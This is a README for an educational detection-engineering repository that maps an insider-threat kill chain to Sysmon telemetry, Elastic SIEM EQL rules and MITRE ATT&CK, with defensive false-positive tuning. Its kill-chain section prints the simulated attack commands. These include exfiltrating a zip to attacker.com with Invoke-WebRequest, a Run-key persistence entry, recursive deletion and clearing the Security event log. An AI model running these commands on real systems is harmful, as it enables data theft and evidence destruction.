#  Insider Threat Detection — ELK SIEM + Sysmon + MITRE ATT&CK

> **Blue Team | Detection Engineering | SOC-Ready**  
> A complete, production-grade detection repository for identifying insider threat activity using PowerShell abuse, LOLBins, Sysmon telemetry, and Elastic SIEM correlation.

---

##  Table of Contents

1. [Project Overview](#project-overview)
2. [Architecture Diagram](#architecture-diagram)
3. [Data Flow](#data-flow)
4. [Detection Strategy](#detection-strategy)
5. [Repository Structure](#repository-structure)
6. [MITRE ATT&CK Coverage](#mitre-attck-coverage)
7. [Kill Chain Phases](#kill-chain-phases)
8. [Correlation Logic](#correlation-logic)
9. [ELK Integration](#elk-integration)
10. [False Positive Reduction](#false-positive-reduction)
11. [Lessons Learned](#lessons-learned)
12. [SOC Value](#soc-value)
13. [Blue Team Learning Outcomes](#blue-team-learning-outcomes)
14. [Conclusion](#conclusion)

---

##  Project Overview

This repository simulates and detects a **full insider threat kill chain** executed by a legitimate user (`ituser`) on a Windows endpoint using only built-in system tools — no malware, no exploits.

### Threat Scenario

| Attribute       | Value                                              |
|-----------------|----------------------------------------------------|
| Actor Type      | Malicious insider — valid domain account           |
| Technique       | Living-off-the-Land (LOLBins) — PowerShell only    |
| Target          | Sensitive project files on local workstation       |
| Goal            | Data exfiltration + evidence destruction           |
| Detection Stack | Sysmon + Elastic Agent + Elastic SIEM              |

### What This Repo Covers

-  6 attack phases fully mapped to MITRE ATT&CK
-  6 individual detection rules (EQL) — one per phase
-  1 full kill-chain correlation rule (EQL sequence)
-  KQL hunt queries for each phase
-  Sysmon Event ID mapping per technique
-  Elastic SIEM integration guide
-  Kibana dashboard templates
-  Sample log events (JSON)
-  Index mapping templates
-  False positive analysis and tuning recommendations

---

##  Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                      WINDOWS ENDPOINT                           │
│                                                                 │
│   ituser (valid account)                                        │
│        │                                                        │
│        ▼                                                        │
│   PowerShell.exe ──► Sysmon (EID 1,3,11,13,23)                 │
│        │                      │                                 │
│        ▼                      ▼                                 │
│   Attack Chain            Windows Event Log                     │
│   ─────────────           (Microsoft-Windows-Sysmon/Operational)│
└───────────────────────────────┬─────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                     ELASTIC AGENT (Fleet)                       │
│                                                                 │
│   Windows Integration ──► ECS Normalization ──► TLS/HTTPS      │
│                                                                 │
│   Data Stream: logs-windows.sysmon_operational-default          │
└───────────────────────────────┬─────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                    ELASTICSEARCH (Cloud/On-Prem)                │
│                                                                 │
│   Index: logs-windows.sysmon_operational-*                      │
│   Index: logs-endpoint.events.*                                 │
│   Alerts: .alerts-security.alerts-default                       │
│                                                                 │
│   ILM: Hot (7d) → Warm (30d) → Cold (90d) → Delete (365d)      │
└───────────────────────────────┬─────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                     ELASTIC SIEM (Kibana)                       │
│                                                                 │
│   Detection Rules Engine                                        │
│   ┌────────────────────────────────────────────────────────┐   │
│   │ Rule Scheduler (every 5m)                              │   │
│   │ EQL Query ──► Match? ──► Alert Document ──► Action     │   │
│   └────────────────────────────────────────────────────────┘   │
│                                                                 │
│   Alerts ──► OS Ticket (Webhook) ──► SOC Investigation         │
└─────────────────────────────────────────────────────────────────┘
```

---

##  Data Flow

```
Windows Host
     │
     ├─ PowerShell executes → Sysmon captures EID 1 (Process Create)
     ├─ Files created       → Sysmon captures EID 11 (File Create)
     ├─ Registry modified   → Sysmon captures EID 13 (Registry Set)
     ├─ Network connection  → Sysmon captures EID 3  (Network Connect)
     └─ Files deleted       → Sysmon captures EID 23 (File Delete)
          │
          ▼
     Windows Event Log (Sysmon/Operational channel)
          │
          ▼
     Elastic Agent (Fleet-managed)
          │  ├─ Reads from Windows Event Log
          │  ├─ Applies ECS field mapping
          │  └─ Enriches with host metadata
          │
          ▼
     Elasticsearch Data Stream
          │  logs-windows.sysmon_operational-default
          │
          ▼
     Elastic SIEM Detection Engine
          │  ├─ Runs EQL rules every 5 minutes
          │  ├─ Matches events → creates alert documents
          │  └─ Triggers webhook → OS Ticket
          │
          ▼
     SOC Analyst
          └─ Investigate → Contain → Eradicate → Recover
```

### ECS Field Mapping (Sysmon → ECS)

| Sysmon Field        | ECS Field                   | Description                    |
|---------------------|-----------------------------|--------------------------------|
| `Image`             | `process.executable`        | Full path of process           |
| `CommandLine`       | `process.command_line`      | Full command line              |
| `ParentImage`       | `process.parent.executable` | Parent process path            |
| `User`              | `user.name`                 | Executing user                 |
| `Computer`          | `host.name`                 | Hostname                       |
| `TargetFilename`    | `file.path`                 | File path (EID 11, 23)         |
| `TargetObject`      | `registry.path`             | Registry key path (EID 13)     |
| `Details`           | `registry.data.strings`     | Registry value data (EID 13)   |
| `DestinationIp`     | `destination.ip`            | Destination IP (EID 3)         |
| `DestinationPort`   | `destination.port`          | Destination port (EID 3)       |
| `ProcessGuid`       | `process.entity_id`         | Unique process identifier      |

---

##  Detection Strategy

### Philosophy

> Detect **behavior chains**, not individual events. A single `powershell.exe` is noise. A sequence of PowerShell → archive → network → deletion from the same user in 2 hours is a confirmed incident.

### Detection Layers

```
Layer 1: Single-event rules (low confidence, high sensitivity)
         → Catch individual TTPs; generate leads for analysts
         → Risk scores: 45–80

Layer 2: Mini-sequences per phase (medium confidence)
         → Correlate 2–3 related events within a phase
         → Risk scores: 65–85

Layer 3: Full kill chain correlation (high confidence, critical)
         → Require all 6 phases in order, same user, same host, 2h window
         → Risk score: 99 | Severity: Critical
```

### Signal-to-Noise Principle

| Rule Type          | Volume | Confidence | SOC Action              |
|--------------------|--------|------------|-------------------------|
| Single phase rule  | High   | Low-Med    | Queue for triage        |
| Phase sequence     | Med    | Medium     | Investigate within 4h   |
| Full kill chain    | Low    | Very High  | Immediate response      |

---

##  Repository Structure

```
insider-threat-detection/
│
├── README.md                          ← This file
│
├── phase-1-execution/
│   ├── README.md                      ← Phase overview + theory
│   ├── detection_rule.eql             ← EQL detection rule (importable)
│   ├── hunt_query.kql                 ← KQL threat hunting query
│   └── mitre_mapping.md               ← MITRE ATT&CK mapping
│
├── phase-2-discovery/
│   ├── README.md
│   ├── detection_rule.eql
│   ├── hunt_query.kql
│   └── mitre_mapping.md
│
├── phase-3-collection/
│   ├── README.md
│   ├── detection_rule.eql
│   ├── hunt_query.kql
│   └── mitre_mapping.md
│
├── phase-4-persistence/
│   ├── README.md
│   ├── detection_rule.eql
│   ├── hunt_query.kql
│   └── mitre_mapping.md
│
├── phase-5-exfiltration/
│   ├── README.md
│   ├── detection_rule.eql
│   ├── hunt_query.kql
│   └── mitre_mapping.md
│
├── phase-6-defense-evasion/
│   ├── README.md
│   ├── detection_rule.eql
│   ├── hunt_query.kql
│   └── mitre_mapping.md
│
├── correlation-rules/
│   ├── insider_full_kill_chain.eql    ← CRITICAL: full sequence rule
│   └── README.md
│
├── dashboards/
│   ├── insider_threat_dashboard.ndjson← Kibana dashboard export
│   └── README.md
│
├── mappings/
│   ├── mitre_full_mapping.md          ← Complete MITRE mapping table
│   ├── sysmon_ecs_mapping.md          ← Sysmon → ECS field reference
│   └── index_template.json            ← Elasticsearch index template
│
├── sample-logs/
│   ├── phase1_execution.json
│   ├── phase2_discovery.json
│   ├── phase3_collection.json
│   ├── phase4_persistence.json
│   ├── phase5_exfiltration.json
│   └── phase6_defense_evasion.json
│
└── detection-logic/
    ├── detection_strategy.md          ← Full detection engineering notes
    └── elk_integration_guide.md       ← ELK setup and tuning guide
```

---

## MITRE ATT&CK Coverage

| Phase | Tactic          | Technique      | Sub-Technique | Tactic ID | Sysmon EID | Rule File                              |
|-------|-----------------|----------------|---------------|-----------|------------|----------------------------------------|
| 1     | Execution       | T1059          | T1059.001     | TA0002    | EID 1      | phase-1-execution/detection_rule.eql  |
| 2     | Discovery       | T1083          | —             | TA0007    | EID 1      | phase-2-discovery/detection_rule.eql  |
| 2     | Discovery       | T1087          | T1087.001     | TA0007    | EID 1      | phase-2-discovery/detection_rule.eql  |
| 3     | Collection      | T1560          | T1560.001     | TA0009    | EID 11     | phase-3-collection/detection_rule.eql |
| 3     | Collection      | T1074          | T1074.001     | TA0009    | EID 11     | phase-3-collection/detection_rule.eql |
| 4     | Persistence     | T1547          | T1547.001     | TA0003    | EID 13     | phase-4-persistence/detection_rule.eql|
| 5     | Exfiltration    | T1041          | —             | TA0010    | EID 3      | phase-5-exfiltration/detection_rule.eql|
| 5     | Command&Control | T1071          | T1071.001     | TA0011    | EID 3      | phase-5-exfiltration/detection_rule.eql|
| 6     | Defense Evasion | T1070          | T1070.004     | TA0005    | EID 23     | phase-6-defense-evasion/detection_rule.eql|
| 6     | Defense Evasion | T1070          | T1070.001     | TA0005    | EID 1      | phase-6-defense-evasion/detection_rule.eql|

---

##  Kill Chain Phases

```
[Phase 1: Execution]
    powershell.exe -ExecutionPolicy Bypass -File steal.ps1
    └── Creates PS session for all subsequent activity

[Phase 2: Discovery]
    Get-ChildItem C:\Projects -Recurse | whoami | net user
    └── Maps sensitive data locations

[Phase 3: Collection]
    Compress-Archive C:\Projects C:\Users\Public\secret.zip
    └── Stages data for exfiltration

[Phase 4: Persistence]
    reg add HKCU\...\Run /v UpdateSvc /d "powershell.exe steal.ps1"
    └── Ensures re-access after account changes

[Phase 5: Exfiltration]
    Invoke-WebRequest -Uri https://attacker.com -InFile secret.zip
    └── Sends staged data out

[Phase 6: Defense Evasion]
    Remove-Item C:\Projects\* -Recurse -Force
    Clear-EventLog -LogName Security
    └── Destroys evidence and source data
```

---

##  Correlation Logic

The correlation rule in `correlation-rules/insider_full_kill_chain.eql` requires:

1. **Same host** (`host.name`) — prevents cross-host false positives
2. **Same user** (`user.name`) — ensures single actor attribution
3. **Ordered sequence** — events must occur in kill-chain order
4. **2-hour window** (`maxspan=2h`) — realistic attack duration
5. **All 6 phases present** — high-confidence, very low FP

```
Time Window: ─────────────────[ 2 HOURS ]─────────────────
             Exec  Disc  Coll  Pers  Exfil  Evasion
              │     │     │     │      │       │
              ▼     ▼     ▼     ▼      ▼       ▼
             EID1  EID1  EID11 EID13  EID3   EID23
              └─────┴─────┴─────┴──────┴───────┘
                         same host.name
                         same user.name
                              │
                              ▼
                    CRITICAL ALERT: risk_score=99
```

---

##  ELK Integration

### Index Patterns

```
logs-windows.sysmon_operational-*   ← Sysmon via Elastic Agent
logs-endpoint.events.process-*      ← Elastic Endpoint process events
logs-endpoint.events.file-*         ← Elastic Endpoint file events
logs-endpoint.events.registry-*     ← Elastic Endpoint registry events
logs-endpoint.events.network-*      ← Elastic Endpoint network events
.alerts-security.alerts-default     ← Generated alerts (read-only)
```

### Importing Rules

1. Navigate to **Security → Rules → Import rules**
2. Upload each `.eql` file from phase directories
3. Review index patterns — update to match your deployment
4. Enable rules and verify "Last Response" shows event count

### Risk Score Mapping

| Phase       | Risk Score | Severity |
|-------------|------------|----------|
| Execution   | 65         | High     |
| Discovery   | 45         | Medium   |
| Collection  | 70         | High     |
| Persistence | 80         | High     |
| Exfiltration| 78         | High     |
| Def.Evasion | 72         | High     |
| Correlation | **99**     | **Critical** |

---

##  False Positive Reduction

| Technique              | FP Source                        | Mitigation Strategy                              |
|------------------------|----------------------------------|--------------------------------------------------|
| PowerShell bypass      | IT admin maintenance scripts     | Whitelist admin host.name or user.name           |
| Directory enumeration  | Dev tools, file managers         | Require -Recurse + sensitive path target         |
| Archive creation       | Backup software, OneDrive        | Require staging location (C:\Public, C:\Temp)    |
| Registry Run key       | Software installers              | Filter by registry.data.strings (must = scripts) |
| Outbound HTTP from PS  | Windows Update, telemetry        | Exclude *.microsoft.com, *.windowsupdate.com     |
| File deletion          | Normal user activity             | Require -Recurse + sensitive path + EID 23       |
| **Full correlation**   | Almost none                      | Sequence requirement eliminates nearly all FP    |

---

##  Lessons Learned

### Detection Engineering

- **Signal vs. Noise**: Individual LOLBin events are too common to alert on alone. Context and sequence are everything.
- **EQL over KQL**: For behavioral detection, EQL sequence queries outperform KQL in both precision and expressiveness.
- **Index matters**: Rules that use wrong index patterns produce zero results — always verify data streams first.
- **ECS normalization**: Consistent field naming (`process.command_line` not `winlog.event_data.CommandLine`) is what makes cross-source rules possible.

### MITRE ATT&CK

- ATT&CK is a **vocabulary**, not a checklist. The real value is using sub-techniques (T1059.001, not just T1059) to write precise detection logic.
- **Tactic sequencing** in ATT&CK reflects real attack progression — Execution enables Discovery, Discovery enables Collection. Detection rules should model this dependency.
- Not every technique needs a separate rule — correlation rules that span multiple tactics provide higher value than 20 single-tactic rules.

### ELK SIEM

- Detection rules need **overlap in lookback windows** (`from: now-6m` with `interval: 5m`) to prevent event gaps.
- `max_signals` must be tuned per rule — high-FP rules need low max_signals to avoid overwhelming the SOC queue.
- Always test rules in **Kibana Discover** before enabling — verify the query returns expected data against your specific index.
- The `threat` array in rule metadata enables automatic MITRE ATT&CK matrix visualization in Kibana.

---

##  SOC Value

| Metric               | Without This Repo          | With This Repo              |
|----------------------|----------------------------|-----------------------------|
| Detection Coverage   | Ad-hoc, incomplete         | 6 phases + full correlation  |
| MTTR                 | Hours–Days                 | Minutes (automated ticket)   |
| Alert Fidelity       | Low (many FP)              | High (behavioral sequence)   |
| Analyst Efficiency   | Manual hunting required    | Guided investigation paths   |
| MITRE Coverage       | Unknown                    | Mapped and documented        |
| Repeatability        | Manual investigation       | Runbook-driven response      |

---

##  Blue Team Learning Outcomes

After working through this repository, practitioners will understand:

1. **How insider threats differ** from external attacks — no initial access phase, no exploit, all legitimate tools
2. **Why LOLBins are difficult to detect** — they blend with normal activity
3. **How to build behavioral detection** — from raw event to correlated kill-chain alert
4. **EQL sequence mechanics** — `by` clause, `maxspan`, event ordering
5. **Sysmon configuration** — which Event IDs to enable and why
6. **ECS field mapping** — translating raw Sysmon XML to searchable ECS fields
7. **False positive management** — not just writing rules, but tuning them for production
8. **MITRE ATT&CK practical application** — using the framework to guide detection coverage

---

##  Conclusion

### How We Detect Insider Threats

Detection relies on **behavioral correlation** — not signature matching. By capturing every layer of the kill chain (execution → discovery → collection → persistence → exfiltration → evasion) as individual telemetry events via Sysmon, and correlating them into a single high-confidence alert via EQL sequence logic, we can detect insider activity that would be invisible to signature-based tools.

### How Correlation Helps

- Reduces 6 medium-confidence individual alerts to **1 critical, actionable alert**
- Provides complete attack context in a single alert document
- Enables SOC analysts to skip triage and go straight to containment
- Eliminates nearly all false positives by requiring ordered sequential behavior

### How We Reduce False Positives

Every rule incorporates: path filtering (sensitive directories only), process parent filtering (exclude legitimate parent processes), content filtering (registry values must contain script interpreters), and the correlation layer eliminates the residual FP that individual rules produce.

### Detection Engineering Takeaway

> *"Write rules that describe attacker behavior, not attacker tools. Tools change. Behavior patterns don't."*

Insider threats use the same tools as legitimate administrators. The difference is **context, sequence, and intent** — which is exactly what EQL sequence-based behavioral detection captures.

---

*Repository maintained for educational and SOC readiness purposes.*  
*All techniques documented with reference to MITRE ATT&CK Framework v14.*
